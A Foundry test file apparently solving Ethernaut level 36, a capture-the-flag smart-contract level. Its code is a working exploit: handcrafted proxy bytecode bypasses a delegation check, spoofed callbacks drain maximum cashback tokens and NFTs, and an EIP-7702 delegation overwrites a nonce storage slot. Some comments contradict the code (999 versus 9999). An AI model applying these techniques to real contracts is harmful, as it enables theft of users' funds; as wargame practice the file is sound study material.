// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level36 {
    function accrueCashback(address, uint256) external;
    function transferFrom(address, address, uint256) external;
    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external;
    function superCashbackNFT() external view returns (address);
    function cashbackRates(address) external view returns (uint256);
    function maxCashback(address) external view returns (uint256);
}

// This is a base contract that we can call the accrueCashback function.
// It passes all the modifiers of accrueCashback on the Cashback contract except for onlyDelegatedToCashback.
// To pass onlyDelegatedToCashback, we need to embed the Cashback contract address in the code, and we can
// do this separately with an additional simple contract that jump over that address stored in the code, and
// delegate calls to this base contract.
contract Accrual {
    // Calls the accrueCashback function for currency and amount.
    // We will not calculate the correct parameters here.
    // It transfers the subsequent cashback tokens to a specified player, which in this case will be an EOA.
    // It also transfers the superCashbackNFT generated.
    // This function will only work once as the NFT ID is set to this contract address by the cashback contract.
    function accrue(address level36, address player, address currency, uint256 amount, uint256 maxCashback) external {
        Level36(level36).accrueCashback(currency, amount);
        // Transfer the level36 1155 balance to our player contract.
        Level36(level36).safeTransferFrom(address(this), player, uint256(uint160(currency)), maxCashback, "");
        // Transfer the superCashbackNFT, which uses the uint256 of the address of the person it is first
        // minted to.
        Level36(Level36(level36).superCashbackNFT())
            .transferFrom(address(this), player, uint256(uint160(address(this))));
    }

    // Satisfies consumeNone condition.
    function consumeNonce() external pure returns (uint256) {
        return 10000;
    }

    // Satisfies onlyUnlocked modifier.
    function isUnlocked() external pure returns (bool) {
        return true;
    }
}

// This contract can be used by an EOA to set the expected nonce value required to mint a superCashbackNFT
// by the cashback contract.
contract SetNonce {
    // This function can be called over an EOA to set the nonce corresponding to the nonce storage
    // slot on the Cashback contract to 999.
    // This then makes it possible for the incrementNonce function to be called over the EOA and
    // return 10000 which is the condition for minting the superCashbackNFT.
    function setNonce() external {
        assembly ("memory-safe") {
            // This is the slot that the nonce is pointed by the cashback contract code.
            sstore(0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03, 9999)
        }
    }
}

contract Level36Test is EthernautTest {
    function testLevel36() public {
        // Lets generate a random EOA for us to use for this level, as if we were using an EOA.
        (address eoa, uint256 eoaKey) = makeAddrAndKey("eoa");

        // We want to create and submit this level as that EOA.
        vm.prank(eoa, eoa);
        _createLevel("36");

        Level36 level36Instance = Level36(levelInstance["36"]);

        address level36Factory = _getAddress("36");

        // By inspecting test logs for this test, we can see that two currencies set were the following.
        // The first currency is the native with the repeated 0xeeee address.
        // The second currency, local to this test and fresh testnet at least, is the create address
        // of the level 36 factory address with nonce 1. It may be higher on other testnets of course!
        address[] memory currencies = new address[](2);
        currencies[0] = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        currencies[1] = vm.computeCreateAddress(_getAddress("36"), 1);

        // There is an issue with the onlyDelegatedToCashback modifier. We can just put the cashback
        // contract address at position 0x17 in the contract code of a contract calling the accrueCashback
        // function.
        // We could put this in the code of any contract using a simple jump instruction, no EOA required.
        // i.e the cashback contract makes the incorrect assumption that only an EOA delegated to the cashback
        // contract (as per EIP 7702) will have the property of having the cashback contract returned in the
        // code at position 0x17.

        // That enables us to bypass the payWithCashback function, and letting us receive an amount of maxCashback
        // tokens for any currency.

        // There is also an issue with the onlyUnlocked modifier. We can just put an isUnlocked() function that
        // returns true in the contract calling the accrueCashback function.

        // There is a similar issue with the newNonce == SUPERCASHBACK_NONCE . We can just put a consumeNonce()
        // function that returns 10000 in the contract calling the accrueCashback function.

        // So, not only can we get an amount of maxCashback tokens for any currency, we can also get a
        // superCashbackNFT.

        // Lets create a base accrual contract which passes those modifiers except for onlyDelegatedToCashback.
        Accrual baseAccrual = new Accrual();

        // Then, create the code for a simple contract which stores the cashback contract address at 0x17.
        // in the code, but jumps over that, and delegates the call to our base contract.
        bytes memory accrualCodeWithAddress = getAccrualCodeWithAddress(baseAccrual, address(level36Instance));

        // Lets create that accrual contract.
        Accrual accrual = createAccrualWithAddress(accrualCodeWithAddress);

        // We can then use this to get maxcashback and an NFT for the first currency.
        // Those are automatically sent to our EOA.
        {
            // Calculate cashback amount to get the maximum.
            uint256 maxCashback0 = level36Instance.maxCashback(currencies[0]);
            uint256 amount0 = 10000 * maxCashback0 / level36Instance.cashbackRates(currencies[0]);

            accrual.accrue(address(level36Instance), eoa, currencies[0], amount0, maxCashback0);
        }

        // Lets create a new accrual contract for the second currency.
        // This is because the superCashbackNFT can only be called once per msg.sender .
        accrual = createAccrualWithAddress(accrualCodeWithAddress);

        {
            // Calculate cashback amount to get the maximum.
            uint256 maxCashback1 = level36Instance.maxCashback(currencies[1]);
            uint256 amount1 = 10000 * maxCashback1 / level36Instance.cashbackRates(currencies[1]);

            accrual.accrue(address(level36Instance), eoa, currencies[1], amount1, maxCashback1);
        }

        // Now, all that is left to do is to claim an NFT linked to our eoa address.

        // The nonce variable is entirely under our control. So all we need to do is delegate to a contract
        // that allows us to set the nonce to 999 such that when we delegate a call to the cashback contract
        // we can redeem an EOA

        // We actually don't have any currencies. But the minting of the superCashbackNFT is still accessible
        // with an amount of zero.
        // The currency.transfer will pass if we set it as the native currency and ensure that the "to" address
        // is an eoa or a contract that can receive ether, although it is zero in our case.

        {
            // Lets create our SetNonce contract for our eoa to delegate to
            SetNonce setNonce = new SetNonce();

            // Let sign an 7702 delegation to our SetNonce contract.
            vm.signAndAttachDelegation(address(setNonce), eoaKey);
            // This is a foundry test, so our EOA needs to be msg.sender and tx.origin.
            vm.prank(eoa, eoa);
            // Now call with the eoa, to set the nonce to 999.
            (bool ok,) = eoa.call(abi.encodeWithSignature("setNonce()"));

            // Now lets sign an 7702 delegation to the level36 cashback contract.
            vm.signAndAttachDelegation(address(level36Instance), eoaKey);
            // This is a foundry test, so our EOA needs to be msg.sender and tx.origin.
            vm.prank(eoa, eoa);
            // Now call the EOA, and it should will execute the level 36 contract logic over the EOA's context.
            (ok,) = eoa.call(
                abi.encodeWithSignature(
                    "payWithCashback(address,address,uint256)", 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, eoa, 0
                )
            );
        }

        // We need to submit the level as if we were an EOA, so tx.origin and msg.sender.
        vm.prank(eoa, eoa);
        require(_submitLevel("36"));
    }

    // Simple function that creates a contract with specified code.
    function createAccrualWithAddress(bytes memory accrualCodeWithAddress) internal returns (Accrual accrual) {
        // Lets create our accrual contract with the address of level36 at 0x17 in the code.
        assembly {
            accrual := create(0, add(accrualCodeWithAddress, 32), mload(accrualCodeWithAddress))
        }
        require(address(accrual) != address(0), "CREATE failed");
    }

    // This function returns creation code for a contract that:
    // 1 Stores the level36 cashback contract address at 0x17 in the runtime.
    // 2 A runtime that jumps over that stored address and delegate calls to our base accrual contract.
    // We will use a minimal delegate proxy for this.
    function getAccrualCodeWithAddress(Accrual accrual, address level36) internal view returns (bytes memory out) {
        // The address is at position 0x17 in the code.
        assembly ("memory-safe") {
            // Set creationCode to the free memory pointer.
            let outPtr := mload(64)
            let creationCodePtr := add(outPtr, 32)
            // Set out to outPtr.
            out := outPtr
            // Structure of creation code will be 0 to 32 is space for a basic init code, then we will start
            // the runtime at 32
            let runtimeOffset := 32
            // We need to place the level36 address at position 23 of that.
            let level36Start := add(runtimeOffset, 3)
            // Lets then add a padding of 32 bytes for the rest of the runtime.
            let paddingOffset := add(level36Start, 32)
            // We need to then place a jump dest.
            let jumpDestOffset := add(paddingOffset, 32)
            // Proxy runtime begins right after the JUMPDEST.
            let proxyOffset := add(jumpDestOffset, 1)
            let proxyLen := 45
            // Total deployed runtime length = (proxyOffset + proxyLen) - runtimeOffset.
            let runTimeLength := sub(add(proxyOffset, proxyLen), runtimeOffset)
            // Set total size of the creation code.
            mstore(outPtr, add(proxyOffset, extcodesize(accrual)))
            // Update the free memory pointer.
            mstore(64, add(add(outPtr, 32), mload(outPtr)))
            // We just need a standard init.
            mstore(creationCodePtr, shl(248, 0x61)) // PUSH2
            mstore(add(creationCodePtr, 1), shl(240, runTimeLength)) // Runtime length, assumed < 2 bytes
            mstore(add(creationCodePtr, 3), shl(248, 0x60)) // PUSH1
            mstore(add(creationCodePtr, 4), shl(248, runtimeOffset)) // Runtime offset, assumed < 1 bytes
            mstore(add(creationCodePtr, 5), shl(248, 0x60)) // PUSH1
            mstore(add(creationCodePtr, 6), 0) //
            mstore(add(creationCodePtr, 7), shl(248, 0x39)) // CODECOPY
            mstore(add(creationCodePtr, 8), shl(248, 0x61)) // PUSH2
            mstore(add(creationCodePtr, 9), shl(240, runTimeLength)) // Runtime length, assumed < 2 bytes
            mstore(add(creationCodePtr, 11), shl(248, 0x60)) // PUSH1
            mstore(add(creationCodePtr, 12), 0)
            mstore(add(creationCodePtr, 13), shl(248, 0xf3))
            // Zero out the padding.
            mstore(add(creationCodePtr, paddingOffset), 0)
            // We then need to start the runtime with a simple jump to offset 22, where we will place a
            // JUMPDEST opcode 5B.
            // So it will be a:
            // PUSH1 0x60
            // 0x17 + 32 = 0x37
            // Then a JUMP 0x56
            mstore(add(creationCodePtr, runtimeOffset), shl(248, 0x60))
            mstore(add(creationCodePtr, add(runtimeOffset, 1)), shl(248, sub(jumpDestOffset, runtimeOffset)))
            mstore(add(creationCodePtr, add(runtimeOffset, 2)), shl(248, 0x56))
            // Then the level36 address.
            mstore(add(creationCodePtr, level36Start), shl(96, level36))
            // Then we need to put the JUMPDEST opcode 5B.
            mstore(add(creationCodePtr, jumpDestOffset), shl(248, 0x5B))

            // We then just need to append a minimal proxy which delegates calls to our base accrual
            // runtime = 363d3d373d3d3d363d73 base_accrual 5af43d82803e903d91602b57fd5bf3

            // First part 363d3d373d3d3d363d73.
            mstore(
                add(creationCodePtr, proxyOffset),
                0x363d3d373d3d3d363d7300000000000000000000000000000000000000000000
            )

            // Then store the address.
            mstore(add(creationCodePtr, add(proxyOffset, 10)), shl(96, accrual))

            // Then the tail 5af43d82803e903d91602b57fd5bf3.
            mstore(
                add(creationCodePtr, add(proxyOffset, 30)),
                0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000
            )

            // We actually need to patch the jump destination in the minimal proxy because we have altered the
            // code length with the jump and the storage of that address at 0x17.
            // In the tail, there is that 0x60 destination 0x57 sequence.
            // So we need to correct the destination at the offset of 40 bytes within the proxy.
            // Deployed offset of proxy start.
            let proxyStart := sub(proxyOffset, runtimeOffset)
            // Deployed offset of the proxy's JUMPDEST.
            let correctDest := add(proxyStart, 43)
            // Correct it in memory.
            mstore8(add(creationCodePtr, add(proxyOffset, 40)), correctDest)
            // And that's it.
        }
    }
}
